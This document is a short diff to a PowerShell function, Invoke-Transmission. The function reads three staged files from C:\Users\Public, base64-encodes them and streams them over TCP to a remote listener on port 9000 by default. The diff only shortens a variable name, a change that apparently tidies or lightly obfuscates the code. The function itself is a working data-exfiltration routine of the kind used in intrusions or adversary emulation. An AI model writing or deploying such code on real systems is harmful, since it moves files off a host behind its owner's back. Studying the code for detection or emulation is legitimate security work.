@@ -10,7 +10,7 @@ function Invoke-Transmission {
         [int]
         $port = 9000
     )
-    $garbagebytes = New-Object byte[] 1
+    $g = New-Object byte[] 1
     $Message1 = [text.Encoding]::Ascii.GetBytes([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\1')))
     $Message2 = [text.Encoding]::Ascii.GetBytes([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\2')))
     $Message3 = [text.Encoding]::Ascii.GetBytes([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\Users\Public\3')))
@@ -24,15 +24,15 @@ function Invoke-Transmission {
     $stream = $client.GetStream()
     sleep 1
     $stream.Write($length1,0,$length1.Length)
-    $stream.read($garbagebytes, 0, $garbagebytes.Length)
+    $stream.read($g, 0, $g.Length)
     $stream.Write($length2,0,$length2.Length)
-    $stream.read($garbagebytes, 0, $garbagebytes.Length)
+    $stream.read($g, 0, $g.Length)
     $stream.Write($length3,0,$length3.Length)
-    $stream.read($garbagebytes, 0, $garbagebytes.Length)
+    $stream.read($g, 0, $g.Length)
     $stream.Write($Message1,0,$Message1.Length)
-    $stream.read($garbagebytes, 0, $garbagebytes.Length)
+    $stream.read($g, 0, $g.Length)
     $stream.Write($Message2,0,$Message2.Length)
-    $stream.read($garbagebytes, 0, $garbagebytes.Length)
+    $stream.read($g, 0, $g.Length)
     $stream.Write($Message3,0,$Message3.Length)
     $client.Close()
     $client.Dispose()
